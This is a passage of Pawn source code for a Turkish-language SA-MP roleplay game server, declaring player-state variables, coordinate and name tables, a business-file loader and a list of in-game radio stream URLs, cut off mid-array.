new TaxiCallTime[MAX_PLAYERS];
new TaxiAccepted[MAX_PLAYERS];
new TaxiCall = 999;
new BusCall = 999;
new MechanicCall = 999;
new MedicCall = 999;
new TaxiWarn[MAX_PLAYERS][MAX_PLAYERS];
new DrinkOffer[MAX_PLAYERS];
new DrinkWarn[MAX_PLAYERS][MAX_PLAYERS];
new PayWarn[MAX_PLAYERS][MAX_PLAYERS];
new Float:StopaniFloats[MAX_PLAYERS][3];
new FishCount[MAX_PLAYERS];
new CraftOffer[MAX_PLAYERS];
new CraftId[MAX_PLAYERS];
new CraftMats[MAX_PLAYERS];
new CraftName[MAX_PLAYERS][50];
new VehicleSpawned[MAX_PLAYERS];
new VehicleOffer[MAX_PLAYERS];
new VehicleId[MAX_PLAYERS];
new VehiclePrice[MAX_PLAYERS];
new ListItemReleaseId[MAX_PLAYERS][50];
new GiveKeysTo[MAX_PLAYERS];
new ListItemTrackId[MAX_PLAYERS][50];
new RepairOffer[MAX_PLAYERS];
new RepairPrice[MAX_PLAYERS];
new RepairCar[MAX_PLAYERS];
new RepairWarn[MAX_PLAYERS][MAX_PLAYERS];
new OnDuty[MAX_PLAYERS];
new ConnectedToPC[MAX_PLAYERS];
new PlayerCuffedTime[MAX_PLAYERS];
new PhoneOnline[MAX_PLAYERS];
new pTazer[MAX_PLAYERS];
new pTazerReplace[MAX_PLAYERS];
new TazerTimeout[MAX_PLAYERS];
new TicketOffer[MAX_PLAYERS];
new TicketMoney[MAX_PLAYERS];
new arr_Towing[MAX_PLAYERS];
new arr_Engine[MAX_VEHICLES];
new IsRentable[MAX_VEHICLES], IsRented[MAX_VEHICLES], RentedBy[MAX_VEHICLES][24];
new Fixr[MAX_PLAYERS];
new gBug[MAX_PLAYERS];
new GotHit[MAX_PLAYERS];
new GoChase[MAX_PLAYERS];
new GetChased[MAX_PLAYERS];
new HitOffer[MAX_PLAYERS];
new HitToGet[MAX_PLAYERS];
new gNews[MAX_PLAYERS];
new JustReported[MAX_PLAYERS];
new NewbieTimer[MAX_PLAYERS];
new gNewbie[MAX_PLAYERS];
new Float:EventFloats[MAX_PLAYERS][6]; // 0 = EventLastR 1 = EventLastX 2 = EventLastY 3 = EventLastZ 4 = EventLastH 5 = EventLastA
new EventLastInt[MAX_PLAYERS];
new EventLastVW[MAX_PLAYERS];
new SkinList = mS_INVALID_LISTID;
new Mobile[MAX_PLAYERS];
new CellTime[MAX_PLAYERS];
new CalledCops[MAX_PLAYERS];
new CopsCallTime[MAX_PLAYERS];
new CalledMedics[MAX_PLAYERS];
new MedicsCallTime[MAX_PLAYERS];
new Music[MAX_PLAYERS];
new PlayerTied[MAX_PLAYERS];
new gRadio[MAX_PLAYERS];
new CallCost[MAX_PLAYERS];
new szAdvert[MAX_PLAYERS][128];
new IsBoundsShowingFFC[MAX_PLAYERS];
new IsBoundsShowingMP1[MAX_PLAYERS];
new IsBoundsShowingMF1[MAX_PLAYERS];
new IsBoundsShowingMP2[MAX_PLAYERS];
new IsBoundsShowingMF2[MAX_PLAYERS];
new IsBoundsShowingAEC[MAX_PLAYERS];
new IsBoundsShowingDH[MAX_PLAYERS];
new IsBoundsShowingCL[MAX_PLAYERS];
new IsBoundsShowingDF[MAX_PLAYERS];
new GlobalChat[MAX_PLAYERS];
new GlobalChatTimer[MAX_PLAYERS];
new EMSCallTime[MAX_PLAYERS];
new EMSAccepted[MAX_PLAYERS];
new MedicCallTime[MAX_PLAYERS];
new MedicAccepted[MAX_PLAYERS];
new MechanicCallTime[MAX_PLAYERS];
new DivorceOffer[MAX_PLAYERS];
new MarryWitness[MAX_PLAYERS];
new MarryWitnessOffer[MAX_PLAYERS];
new MarriageCeremoney[MAX_PLAYERS];
new ProposeOffer[MAX_PLAYERS];
new ProposedTo[MAX_PLAYERS];
new GotProposedBy[MAX_PLAYERS];
new slotselection[MAX_PLAYERS];
new ServiceTime[MAX_PLAYERS];
new WasHereForPaycheck[MAX_PLAYERS];
new SignedPaycheck[MAX_PLAYERS];
new MissedPaychecks[MAX_PLAYERS];
new LiveOffer[MAX_PLAYERS];
new IsTheReporter[MAX_PLAYERS];
new TalkingLive[MAX_PLAYERS];
new HidePM[MAX_PLAYERS];
new Backup[MAX_PLAYERS];
new RadarActive[MAX_PLAYERS];
new RadarWarning[MAX_PLAYERS];
new Text:RadarTitle[MAX_PLAYERS];
new Text:RadarContext[MAX_PLAYERS];
new FindingJob[MAX_PLAYERS];
new FindingDealership[MAX_PLAYERS];
new ShakeHandRequest[MAX_PLAYERS];
new ShakeHandStyle[MAX_PLAYERS];
new TutorialProgress[MAX_PLAYERS];
new Float:ValidArmor[MAX_PLAYERS];
new PhonePrivacy[MAX_PLAYERS];
new MP3Station[MAX_PLAYERS];
new BoomBoxSet[MAX_PLAYERS];
new PizzaVehicles[12];
new Bar:PizzaBar[MAX_PLAYERS];
new FishNamesNumber = 22;
new Float: fVehSpeed[MAX_PLAYERS];
new Float:PlayerPos[MAX_PLAYERS][6];
new Float:TelePos[MAX_PLAYERS][6];
new levelexp = 4;
// LSPD YENÝ ÝNTERÝOR KAPILAR
new LSPDLobby[10];
new LSPDLobbyStatus;
new LSPDLobbyStatus2;
new LSPDLobbyStatus3;
new LSPDCells[4];
new LSPDCellsStatus;
new LSPDOffice[2];
new LSPDOfficeStatus[2];
new LSPDChief[4];
new LSPDChiefStatus;
// /Cuenta
new Showing[MAX_PLAYERS];
new Text:CuentaBox;
new Text:CuentaLogo;
new Text:CuentaGeneral;
new Text:CuentaInmuebles;
new Text:CuentaAutos;
new Text:CuentaInventario;
new Text:CuentaCerrar;
//
// Gate
new gEdit[MAX_PLAYERS];
new gEditID[MAX_PLAYERS];
new Float:gPos[MAX_PLAYERS][3];
new Float:gRot[MAX_PLAYERS][3];
// Hýz Limiti Sistemi
new Speedlimit[MAX_PLAYERS];
// Göz baðlama
new Blindfolded[MAX_PLAYERS];
// Benzin Sistemi
#define FUEL_PRICE 4
new RefuelingVehiclePrice[MAX_PLAYERS];
new Float: Fuel[MAX_VEHICLES] = 100.0;
new isrefuelling[MAX_PLAYERS] = 0;
new Bar:FuelBar[MAX_PLAYERS] = INVALID_BAR_ID;
new RefuelingVehicleTimer[MAX_PLAYERS];
// VÝP
new VIPisci[MAX_PLAYERS];//VIP MESLEK
new VipVehicles[14];
// Textdraw
new Text:site;
// Radar
enum rInfo
{
	Float:tX,
	Float:tY,
	Float:tZ,
	Float:tRX,
	Float:tRY,
	Float:tRZ,
	Float:rRadio,
	rVelMax,
	rCreado
}
new RadarInfo[MAX_RADAR][rInfo];
new Text:Foto;
new LimiteSuperado[MAX_PLAYERS];

// Boombox Sistemi
new Boombox[MAX_PLAYERS];
new BoomboxObject[MAX_PLAYERS];
new BoomboxStream[MAX_PLAYERS];
new BoomboxPlayer[MAX_PLAYERS];
new BoomboxURL[MAX_PLAYERS][256];
new Float:bpos[MAX_PLAYERS][4];
//hile testi
new KontrolEdildi[MAX_PLAYERS];
forward KontrolEdiver(playerid);
stock OyuncuIsmiNedir(playerid) {
	new isim[MAX_PLAYER_NAME];
	GetPlayerName(playerid, isim, MAX_PLAYER_NAME);
	return isim;
}
IsimTagSifirla(playerid)
{
    foreach (new i : Player) {
		ShowPlayerNameTagForPlayer(i, playerid, 1);
	}
	if (IsValidDynamic3DTextLabel(KontrolText[playerid])) DestroyDynamic3DTextLabel(KontrolText[playerid]);

    KontrolText[playerid] = Text3D:INVALID_3DTEXT_ID;
    return 1;
}
forward RandomMessage();

// Araç Kullanýlmaz Halde
new Float: explodehealth;
// Giþeler
new Giseler[6];
// SÝLAH BIRAKMA SÝSTEMÝ
enum silahInfos
{
	slModel,
	Float:slX,
	Float:slY,
	Float:slZ,
	slVW,
	slINT,
	slObje,
	Aktif
}
/*
new YerdekiSilahlar[MAX_YERDEKI_SILAH][silahInfos];

new SilahObjeleri[47][0] =
{
	{0},
	{331},
	{333},
	{334},
	{335},
	{336},
	{337},
	{338},
	{339},
	{341},
	{321},
	{322},
	{323},
	{324},
	{325},
	{326},
	{342},
	{343},
	{344},
	{0},
	{0},
	{0},
	{346},
	{347},
	{348},
	{349},
	{350},
	{351},
	{352},
	{353},
	{355},
	{356},
	{372},
	{357},
	{358},
	{359},
	{360},
	{361},
	{362},
	{363},
	{364},
	{365},
	{366},
	{367},
	{368},
	{368},
	{371}
};
*/
//new bool:SilahKontrol[MAX_PLAYERS][44];
new BigEar[MAX_PLAYERS];
//--------------------------[ ARRAYS ]---------------------------
new
	Float:AdminPrisonFloat[18][3] = {
		{215.664749, 1806.403198, 1618.534423},
		{211.635513, 1806.531005, 1618.534423},
		{207.159301, 1806.923339, 1618.535888},
		{201.544662, 1806.452758, 1618.535888},
		{197.230133, 1806.381225, 1618.535888},
		{193.142883, 1806.796752, 1618.535888},
		{215.664749, 1806.403198, 1614.260375},
		{211.635513, 1806.531005, 1614.260375},
		{207.159301, 1806.923339, 1614.260375},
		{201.544662, 1806.452758, 1614.260375},
		{197.230133, 1806.381225, 1614.260375},
		{193.142883, 1806.796752, 1614.260375},
		{215.664749, 1806.403198, 1609.985473},
		{211.635513, 1806.531005, 1609.985473},
		{207.159301, 1806.923339, 1609.985473},
		{201.544662, 1806.452758, 1609.985473},
		{197.230133, 1806.381225, 1609.985473},
		{193.142883, 1806.796752, 1609.985473}
};

#if defined TREASURE_HUNT_ENABLED
new
	iHuntLocation,
	iHuntPickup,
	Text3D: lHunt,
	Float: fTreasureHuntLS[79][3] = {
		{1229.6487, 2656.6077, 10.8203},
		{723.9209, -1827.9728, -11.1979},
		{975.8365, -1553.5372, 21.5021},
		{2838.0945, -2355.9885, 42.7344},
		{2864.8975, -2125.0532, 5.9132},
		{2839.2737, -1333.6603, 11.1132},
		{305.7408, -1348.6904, 53.3819},
		{300.4908, -1343.3966, 60.0211},
		{567.0254, -1368.8667, 52.4344},
		{-574.8304, -1484.6580, 14.3438},
		{-1848.4028, -1708.3975, 41.1117},
		{-84.5177, -102.4145, 6.4844},
		{359.0852, -1401.2878, 20.4090},
		{-406.8927, -1448.9119, 50.9145},
		{2783.3496, -1246.1157, 62.2969},
		{2750.9673, -2261.2080, 42.2668},
		{2423.9233, -2283.6018, 42.4465},
		{2258.9204, -2458.7249, 42.1496},
		{1627.6660, -2286.4536, 94.1270},
		{680.0054, 824.4684, -42.9609},
		{-84.7650, -223.2539, 80.1250},
		{-1062.0853, -696.3816, 56.3359},
		{-744.2923, -796.8502, 152.1255},
		{-609.9691, -789.1779, 79.9550},
		{1019.3333, -301.4924, 77.3594},
		{2351.4570, -653.0359, 128.0547},
		{2751.4368, -2189.9272, 46.2275},
		{1498.1407, -1665.2388, 34.0469},
		{598.8820, -1266.4218, 64.1859},
		{1094.6667, -675.9512, 110.1484},
		{65.3320, -1820.0994, -57.3189},
		{302.2582, 1035.6158, 1104.5601},
		{-1094.6779, 606.7272, 1116.5078},
		{1094.1510, -2036.9094, 82.7574},
		{1786.7986, -1303.2233, 13.5532},
		{1956.6277, -1199.6770, 16.5859},
		{2216.9233, -1190.1036, 33.5313},
		{2708.2070, -2187.5305, 27.9262},
		{1846.2129, -1135.9796, 51.8616},
		{1986.8707, -1114.6799, 35.6250},
		{2179.1436, -2008.8317, 32.4801},
		{2216.3784, -2698.1467, 17.8828},
		{603.2033, -1628.5216, 28.0547},
		{660.7752, -1602.5293, 20.3269},
		{688.5105, -1607.3796, 22.0391},
		{1654.8735, -1638.1479, 83.7813},
		{1671.3395, -1344.6774, 158.4766},
		{1651.7982, -1271.9119, 167.5547},
		{1681.6056, -1223.9996, 167.5547},
		{1278.5238, -1697.4240, 39.4375},
		{1481.8771, -1790.1433, 156.7533},
		{1764.0298, -2286.3223, 26.7960},
		{2202.5444, -2330.3840, 33.7149},
		{2280.8369, -1952.3245, 21.2188},
		{2737.8037, -1760.2153, 44.1507},
		{2840.6848, -2538.9077, 18.2075},
		{2745.8557, -1689.5879, 30.6551},
		{2660.9539, -1458.9890, 79.3805},
		{2606.5115, -1299.3252, 81.1481},
		{1099.8422, -824.3608, 114.4477},
		{939.5084, -910.8499, 80.7187},
		{309.7915, -1146.1421, 92.0492},
		{-1412.3374, -23.8541, 6.0000},
		{-2483.6931, -1549.5001, 401.5734},
		{-2753.6919, -2000.8949, 40.9872},
		{-2712.7534, -344.6357, 54.4080},
		{-1026.7931, -705.2756, 135.5049},
		{2072.7185, -1000.6807, 58.9766},
		{919.1627, -1021.8905, 107.5781},
		{-84.5577, -223.3596, 80.1250},
		{2505.3049, -2640.7354, 13.8623},
		{1474.5920, -2287.0769, 42.4205},
		{2590.4080, -632.3589, 133.3495},
		{-534.0347, -102.9933, 63.2969},
		{323.5139, -1131.3894, 80.9141},
		{194.7249, -1230.7240, 76.0469},
		{226.2876, -1186.0181, 72.0313},
		{955.2682, -719.9095, 122.2109},
		{1334.1615, -650.9788, 108.2632}
};
#endif

new Songs[7][1] = {
{1187},
{1185},
{1183},
{1097},
{1076},
{1068},
{1062}
};

new CIV[] = {7,19,20,23,73,101,122};
new STD1[] = {0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 3, 3, 3, 3, 3};
new STD2[] = {0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 3, 3, 3};
new STD3[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3};
new STD4[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 2, 3};
new SELLCAR1[] = { 100, 112, 124, 134, 147, 157, 163, 176, 189, 194, 200 };
new SELLCAR2[] = { 209, 213, 225, 237, 245, 256, 261, 272, 287, 298, 300 };
new SELLCAR3[] = { 305, 317, 321, 337, 345, 355, 367, 375, 386, 396, 400 };
new SELLCAR4[] = { 407, 412, 427, 437, 442, 456, 461, 475, 489, 491, 500 };

new FishNames[22][20] = {
{"Deniz Kabuðu"}, {"Sarýkuyruk"}, {"Hani Balýðý"},
{"Kaya Balýðý"}, {"Pantolon Balýðý"}, {"Alabalýk"},
{"Kýlýç Balýðý"}, {"Konserve"}, {"Uskumru"},
{"Levrek"}, {"Bot"}, {"Turna Balýðý"},
{"Yelken Balýðý"}, {"Çöp"}, {"Tuna"},
{"Yýlanbalýðý"}, {"Yunus"}, {"Köpekbalýðý"},
{"Kaplumbaða"}, {"Kedibalýðý"}, {"Para Çantasý"},
{"Kýlýçbalýðý"}
};
//---------------------------[ PET SÝSTEMÝ ]------------------------
new Text3D:PetText[MAX_PLAYERS];

static const VehicleName[212][] = {
	"Landstalker","Bravura","Buffalo","Linerunner","Perennial","Sentinel","Dumper","Firetruck","Trashmaster","Stretch",
	"Manana","Infernus","Voodoo","Pony","Mule","Cheetah","Ambulance","Leviathan","Moonbeam","Esperanto","Taxi",
	"Washington","Bobcat","Mr Whoopee","BF Injection","Hunter","Premier","Enforcer","Securicar","Banshee","Predator",
	"Bus","Rhino","Barracks","Hotknife","Trailer","Previon","Coach","Cabbie","Stallion","Rumpo","RC Bandit", "Romero",
	"Packer","Monster","Admiral","Squalo","Seasparrow","Pizzaboy","Tram","Trailer","Turismo","Speeder","Reefer","Tropic","Flatbed",
	"Yankee","Caddy","Solair","Berkley's RC Van","Skimmer","PCJ-600","Faggio","Freeway","RC Baron","RC Raider",
	"Glendale","Oceanic","Sanchez","Sparrow","Patriot","Quad","Coastguard","Dinghy","Hermes","Sabre","Rustler",
	"ZR-350","Walton","Regina","Comet","BMX","Burrito","Camper","Marquis","Baggage","Dozer","Maverick","News Chopper",
	"Rancher","FBI Rancher","Virgo","Greenwood","Jetmax","Hotring Racer","Sandking","Blista Compact","Police Maverick",
	"Boxville","Benson","Mesa","RC Goblin","Hotring Racer A","Hotring Racer B","Bloodring Banger","Rancher","Super GT",
	"Elegant","Journey","Bike","Mountain Bike","Beagle","Cropduster","Stuntplane","Tanker","Road Train","Nebula","Majestic",
	"Buccaneer","Shamal","Hydra","FCR-900","NRG-500","HPV-1000","Cement Truck","Tow Truck","Fortune","Cadrona","FBI Truck",
	"Willard","Forklift","Tractor","Combine","Feltzer","Remington","Slamvan","Blade","Freight","Streak","Vortex","Vincent",
	"Bullet","Clover","Sadler","Firetruck","Hustler","Intruder","Primo","Cargobob","Tampa","Sunrise","Merit","Utility",
	"Nevada","Yosemite","Windsor","Monster A","Monster B","Uranus","Jester","Sultan","Stratum","Elegy","Raindance","RC Tiger",
	"Flash","Tahoma","Savanna","Bandito","Freight","Trailer","Kart","Mower","Duneride","Sweeper","Broadway",
	"Tornado","AT-400","DFT-30","Huntley","Stafford","BF-400","Newsvan","Tug","Trailer","Emperor","Wayfarer",
	"Euros","Hotdog","Club","Trailer","Trailer","Andromada","Dodo","RCCam","Launch","Police Car (LSPD)","Police Car (SFPD)",
	"Police Car (LVPD)","Police Ranger","Picador","S.W.A.T. Van","Alpha","Phoenix","Glendale","Sadler","Luggage Trailer A",
	"Luggage Trailer B","Stair Trailer","Boxville","Farm Plow","Utility Trailer"
};

new Peds[217][1] = {
{299},
{288},//TEAM_ADMIN
{286},{287},{228},{113},{120},{147},{294},{227},{61},{171},
{247},//CIVILIANS DOWN HERE
{248},{100},{256},{263},{262},{261},{260},{259},{258},{257},{256},{255},
{253},{252},{251},{249},{246},{245},{244},{243},{242},{241},{240},{239},
{238},{237},{236},{235},{234},{233},{232},{231},{230},{229},
{226},{225},{173},{174},{175},{224},{223},{222},{221},{220},{219},{218},
{217},{216},{215},{214},{213},{212},{211},{210},{209},
{207},{206},{205},{204},{203},{202},{201},{200},{199},{198},{197},{196},
{195},{194},{193},{192},{191},{190},{189},{185},{184},{183},
{182},{181},{180},{179},{178},{176},{172},{170},{168},{167},{162},
{161},{160},{159},{158},{157},{156},{155},{154},{153},{152},{151},
{146},{145},{144},{143},{142},{141},{140},{139},{138},{137},{136},{135},
{134},{133},{132},{131},{130},{129},{128},{254},{99},{97},{96},{95},{94},
{92},{90},{89},{88},{87},{85},{84},{83},{82},{81},{80},{79},{78},{77},{76},
{75},{73},{72},{69},{68},{67},{66},{64},{63},{62},{58},{57},{56},{55},
{54},{53},{52},{51},{50},{49},{45},{44},{43},{41},{39},{38},{37},{36},{35},
{34},{33},{32},{31},{30},{29},{28},{27},{26},{25},{24},{23},{22},{21},{20},
{19},{18},{17},{16},{15},{14},{13},{12},{11},{10},{1},{2},
{290},//ROSE
{291},//PAUL
{292},//CESAR
{293},//OGLOC
{187},
{296},//JIZZY
{297},//MADDOGG
{298},//CAT
{299}//ZERO
};

// Business Settings
enum bizInfo
{
	bType,
	bStatus,
	bOwner[32],
	Float:bX,
	Float:bY,
	Float:bZ,
	bPickup,
	bMoney,
	bProducts,
	Text3D:bText,
	bSold,
	bLevel,
	bPrice,
	bAP
}
new BizInfo[MAX_BIZ][bizInfo];

stock LoadBiz()
{
    if(!fexist("biz.cfg")) fcreate("biz.cfg");
	new binfo[12][32];
	new string[256];
	new File:file = fopen("biz.cfg", io_read);
	if(file)
	{
	    new idx = 1;
		while(idx < MAX_BIZ)
		{
		    fread(file, string);
		    split(string, binfo, '|');
		    BizInfo[idx][bType] = strval(binfo[0]);
		    BizInfo[idx][bStatus] = strval(binfo[1]);
		    format(BizInfo[idx][bOwner], 32, "%s", binfo[2]);
		    BizInfo[idx][bX] = floatstr(binfo[3]);
		    BizInfo[idx][bY] = floatstr(binfo[4]);
		    BizInfo[idx][bZ] = floatstr(binfo[5]);
		    BizInfo[idx][bMoney] = strval(binfo[6]);
		    BizInfo[idx][bProducts] = strval(binfo[7]);
		    BizInfo[idx][bSold] = strval(binfo[8]);
		    BizInfo[idx][bLevel] = strval(binfo[9]);
		    BizInfo[idx][bPrice] = strval(binfo[10]);
		    BizInfo[idx][bAP] = strval(binfo[11]);
		    if(BizInfo[idx][bType]) // If Business is owned
		    {
		    	BizInfo[idx][bPickup] = CreateDynamicPickup(1272, 1, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ], 0);
		    	if(!strcmp("GOV", BizInfo[idx][bOwner])) format(string, sizeof(string), "ID: %d\n%s\nSahibi: %s\nDurum: Satilik\nFiyat: %d $", idx, RBT(idx), BizInfo[idx][bOwner], BizInfo[idx][bPrice]);
				else format(string, sizeof(string), "ID: %d\n%s\nSahibi: %s\nDurumu: %s", idx, RBT(idx), BizInfo[idx][bOwner], RBS(idx));
		    	BizInfo[idx][bText] = CreateDynamic3DTextLabel(string, COLOR_WHITE, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]+0.3, 15);
			}
			idx++;
	    }
	}
	print("Ýþyeri dosyalarý baþarýyla yüklendi.");
	return 1;
}

enum VehicleRadioEnum
{
	radioname[32],
	radiourl[128],
	listeners
}

new VehicleRadioListing[220][VehicleRadioEnum] = {
// Alternative (0-9)
{"Idobi Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=21585"},
{"181.FM The Buzz","http://yp.shoutcast.com/sbin/tunein-station.pls?id=37586"},
{"RauteMusik.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1275071"},
{"FM4","http://yp.shoutcast.com/sbin/tunein-station.pls?id=581319"},
{"ChroniX Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377260"},
{"Pinguin Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=199753"},
{"KEXP","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1272835"},
{"KCRW Simulcas","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1269598"},
{"SULTAN RADYO","http://188.132.234.206:8000/listen.pls"},
{"1.FM Channel X","http://188.132.234.206:8000/listen.pls?id=1274225"},

// Blues 10-19)
{"1.FM - Blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1270282"},
{"BellyUp4Blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=11408"},
{"CALMRADIO - BLUES","http://yp.shoutcast.com/sbin/tunein-station.pls?id=205177"},
{"KOQX Blues Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1271824"},
{"GotRadio - Bit 'O Blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=533805"},
{"radioio blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1278494"},
{"Polskie Radio - Blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1044755"},
{"Big Blue Swing","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377377"},
{"City Sounds Radio Blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=20151"},
{"Calm Radio Blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=205177"},

// Classical (20-29)
{"CLASSICAL 102","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1676910"},
{"Iowa Public Radio Classical","http://yp.shoutcast.com/sbin/tunein-station.pls?id=177883"},
{"181.FM Classic Hits","http://yp.shoutcast.com/sbin/tunein-station.pls?id=213419"},
{"Cinemix","http://yp.shoutcast.com/sbin/tunein-station.pls?id=614375"},
{"Venice Classic Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1704166"},
{"Solo Piano SKY.FM.","http://yp.shoutcast.com/sbin/tunein-station.pls?id=600682"},
{"Mostly Classical - SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=744232"},
{"Adagio.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=212505"},
{"Classical 96.3FM CFMZ","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2271823"},
{"Abacus.fm Mozart Piano","http://yp.shoutcast.com/sbin/tunein-station.pls?id=119965"},

// Country (30-39)
{"181.FM Kickin' Country","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1283687"},
{"Always Country","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1274260"},
{"COUNTRY 108","http://yp.shoutcast.com/sbin/tunein-station.pls?id=668943"},
{"181.FM Highway 181","http://yp.shoutcast.com/sbin/tunein-station.pls?id=147942"},
{"HPR1","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1270526"},
{"Radio Positiva Sertaneja","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2890335"},
{"1.FM Country","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1274603"},
{"Boot Liquor","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377561"},
{"Absolute COUNTRY Hits","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1268458"},
{"181.FM Real Country","http://yp.shoutcast.com/sbin/tunein-station.pls?id=163622"},

// Decades (40-49)
{"Big R Radio Warm 101.6","http://yp.shoutcast.com/sbin/tunein-station.pls?id=33097"},
{"Big R Radio The Hawk","http://yp.shoutcast.com/sbin/tunein-station.pls?id=211531"},
{"Big R Radio 100.7 The Mix","http://yp.shoutcast.com/sbin/tunein-station.pls?id=61826"},
{"Abacus.fm Vintage Jazz","http://yp.shoutcast.com/sbin/tunein-station.pls?id=242774"},
{"Oldies104","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1271826"},
{"1.FM 50s and 60s","http://yp.shoutcast.com/sbin/tunein-station.pls?id=37833"},
{"The Doo-Wop Express","http://yp.shoutcast.com/sbin/tunein-station.pls?id=727560"},
{"Beatles Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1273220"},
{"1.FM 80s Channel","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1274599"},
{"SKY.FM 80s","http://yp.shoutcast.com/sbin/tunein-station.pls?id=737152"},

// Easy Listening (50-59)
{"Slow Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1658657"},
{"MUSIK.LOUNGE","http://yp.shoutcast.com/sbin/tunein-station.pls?id=130940"},
{"Blue FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=48138"},
{"SKY.FM Mostly Classical","http://yp.shoutcast.com/sbin/tunein-station.pls?id=744232"},
{"Radio227 Easy Listening","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2313198"},
{"COOL93","http://yp.shoutcast.com/sbin/tunein-station.pls?id=63135"},
{"KLUX 89.5HD -","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1697"},
{"AbidingRadio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=470854"},
{"Lounge Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1288934"},
{"1.FM The Chillout Loung","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1268725"},

// Electronic (60-69)
{"TechnoBase.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377200"},
{"Vocal Trance","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1177953"},
{"MUSIK.HOUSE Funky","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2128868"},
{"Trance Channel","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1193516"},
{"HouseTime.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377360"},
{"dubstep.fm","http://yp.shoutcast.com/sbin/tunein-station.pls?id=7225"},
{"54House.FM.","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2808203"},
{"#MUSIK.DRUMSTEP","http://yp.shoutcast.com/sbin/tunein-station.pls?id=46883"},
{"HardBase.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377430"},
{"Techno4Ever Main","http://yp.shoutcast.com/sbin/tunein-station.pls?id=226769"},

// Folk (70-79)
{"Radio Free Vermont","http://yp.shoutcast.com/sbin/tunein-station.pls?id=168942"},
{"Pink Narodna Muzika","http://yp.shoutcast.com/sbin/tunein-station.pls?id=883729"},
{"Dzungla Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1279638"},
{"Folk Alley","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1273365"},
{"Radio BN","http://yp.shoutcast.com/sbin/tunein-station.pls?id=29949"},
{"Radio Glas Drine","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1841408"},
{"COOL radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=550002"},
{"AM 1710 Antioch OT","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2699"},
{"A&P Radio Network","http://yp.shoutcast.com/sbin/tunein-station.pls?id=563824"},
{"New Age SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=412093"},

// Inspirational (80-89)
{"Russian Christian Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1280598"},
{"AbidingRadio INSTRUMENTAL","http://yp.shoutcast.com/sbin/tunein-station.pls?id=470854"},
{"1-ONE NATION FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1988533"},
{"XL Radio Gurbani Kirtan","http://yp.shoutcast.com/sbin/tunein-station.pls?id=272693"},
{"Radio Lumiere Miami","http://yp.shoutcast.com/sbin/tunein-station.pls?id=341387"},
{"Ancient Faith Music","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2010550"},
{"Bautista Radio 89.7 FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=347942"},
{"Radio Nueva Vida","http://yp.shoutcast.com/sbin/tunein-station.pls?id=208506"},
{"ChristianRock","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1266649"},
{"FBC Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=95154"},

// International (90-99)
{"Arabic Music Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=326370"},
{"SEOULFM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=246183"},
{"Radio CARERA NUMBER ONE","http://yp.shoutcast.com/sbin/tunein-station.pls?id=289391"},
{"Schlagerhoelle","http://yp.shoutcast.com/sbin/tunein-station.pls?id=702040"},
{"Ballermann-Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=63072"},
{"RADIONL","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1281197"},
